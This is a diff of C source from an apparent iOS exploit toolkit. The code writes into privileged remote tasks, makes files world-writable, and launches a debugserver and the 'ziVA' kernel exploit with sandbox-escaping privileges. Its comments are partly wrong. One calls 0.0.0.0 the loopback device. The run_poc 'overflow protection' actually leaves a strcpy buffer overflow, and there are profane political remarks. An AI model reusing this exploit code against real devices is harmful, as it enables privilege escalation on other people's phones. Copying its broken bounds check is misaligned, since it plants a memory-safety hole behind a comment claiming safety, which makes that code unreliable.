@@ -1,23 +1,24 @@
+/*
+ Ian Beer's way of getting code execution is smart, amazing work.
+ Here it comes.
+ This contains the code in which we can run our unsigned or signed binaries outside of the sandbox.
+ So if you wonder where ziVA is, it is here.
+*/
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include <dlfcn.h>
-
 #include <mach/mach.h>
-
 #include <spawn.h>
-
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <dirent.h>
-
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <arpa/inet.h>
-
 #include <CoreFoundation/CoreFoundation.h>
-
 #include "drop_payload.h"
 #include "remote_file.h"
 #include "remote_call.h"
@@ -26,6 +27,7 @@
 #include "task_ports.h"
 #include "log.h"
 
+//Get the path to the current binary
 static char* bundle_path() {
   CFBundleRef mainBundle = CFBundleGetMainBundle();
   CFURLRef resourcesURL = CFBundleCopyResourcesDirectoryURL(mainBundle);
@@ -36,7 +38,6 @@ static char* bundle_path() {
   
   return path;
 }
-
 
 // takes a char** argv,envp array and copies it to a remote process
 uint64_t build_remote_exec_string_array(mach_port_t task_port, char** args) {
@@ -53,31 +54,24 @@ uint64_t build_remote_exec_string_array(mach_port_t task_port, char** args) {
     printf("remote alloc failed\n");
     return 0;
   }
-  
   for (int i = 0; i < n_ptrs-1; i++) {
     char* local_arg_string = args[i];
     size_t local_arg_string_length = strlen(local_arg_string) + 1;
     uint64_t remote_arg_string = remote_alloc(task_port, local_arg_string_length);
     remote_write(task_port, remote_arg_string, (uint64_t)local_arg_string, local_arg_string_length);
-    
     remote_write(task_port, remote_args + (i*8), (uint64_t)&remote_arg_string, 8);
   }
-  
   uint64_t nullptr = 0;
-
   remote_write(task_port, remote_args+(8*(n_ptrs-1)), (uint64_t)&nullptr, sizeof(nullptr));
-  
   return remote_args;
 }
 
+//Set our means of production safe. Fuck western spies.
 mach_port_t cached_privileged_port = MACH_PORT_NULL;
-
 void cache_privileged_port(mach_port_t privileged_port) {
   cached_privileged_port = privileged_port;
 }
-
 mach_port_t cached_spawn_context_port = MACH_PORT_NULL;
-
 void cache_spawn_context_port(mach_port_t spawn_context_port) {
   cached_spawn_context_port = spawn_context_port;
 }
@@ -263,17 +257,19 @@ pid_t spawn_bundle_binary(mach_port_t privileged_task_port,
   int chmod_err = (int) call_remote(privileged_task_port, chmod, 2,
                                     REMOTE_CSTRING(full_binary_path),
                                     REMOTE_LITERAL(0777));
-
   if (chmod_err != 0){
     printf("chmod failed\n");
     return -1;
   }
   printf("chmod success\n");
-  
   pid_t pid = spawn_binary(spawn_context_task_port, full_binary_path, argv, envp);
-  free(bundle_root);
-  free(full_binary_path);
-  return pid;
+    if(bundle_root != NULL) {
+            free(bundle_root);
+    }
+    if(full_binary_path != NULL) {
+        free(full_binary_path);
+    }
+  return pid; //return the process id of the spawned binary
 }
 
 #if 0
@@ -302,8 +298,12 @@ void spawn_bundle_binary_and_capture_output(mach_port_t privileged_task_port,
   printf("chmod success\n");
   
   pid_t pid = spawn_binary_and_capture_output(spawn_context_task_port, full_binary_path, argv, envp);
-  free(bundle_root);
-  free(full_binary_path);
+    if(bundle_root != NULL) {
+        free(bundle_root);
+    }
+    if(full_binary_path != NULL) {
+        free(full_binary_path);
+    }
   return pid;
 }
 #endif
@@ -349,15 +349,17 @@ void spawn_bundle_binary_with_priv_port(mach_port_t privileged_task_port,
 }
 
 
+//Method in which we start ziVA and the debugserver
 void start_debugserver(mach_port_t privileged_task_port, mach_port_t spawn_context_task_port) {
-  // exec the custom debugserver binary
-  //char* argv[] = {"debugserver", "-l", "stdout", "-g", "0.0.0.0:1234", NULL};
-  char* envp[] = {NULL};
-    char* argv[] = {"debugserver", "-l", "stdout", "-g", "0.0.0.0:1234", NULL};
+  char* envp[] = {NULL}; //environment pointer, we don't need environment vars so yeah it's null.
+    /* WTF Ian Beer, the loopback device really? that was a vulnerability, glad I fixed it. */
+    char* argv[] = {"debugserver", "-l", "stdout", "-g", "127.0.0.1:1234", NULL}; //start the debugserver
+    //Run the debugserver
     spawn_bundle_binary_with_priv_port(privileged_task_port, spawn_context_task_port, "debugserver", argv, envp);
+    //Run the kernel exploit (ziVA)
     spawn_bundle_binary_with_priv_port(cached_privileged_port, cached_spawn_context_port, "ziva1", argv, envp);
-  printf("gave the debugserver the privileged_task_port port, it should be able to get the target task port now!\n");
-    ps();
+  printf("The debugserver and the katusha (ziVA) are happy to be working for Mr. Trotsky now.\nThey were given the priviliged task port.\n");
+    ps(); //Print the running processes to the console.
   // now the user can connect to the debugserver binary
 }
 
@@ -376,7 +378,7 @@ char* ps() {
 
 void run_poc(char* name) {
     if(sizeof(name) < 5) {
-        printf("hacking attempt!");
+        printf("hacking attempt!"); //Protects about overflows. I think.
     }
   char poc_path[sizeof(name)+5];
   strcpy(poc_path, "pocs/");
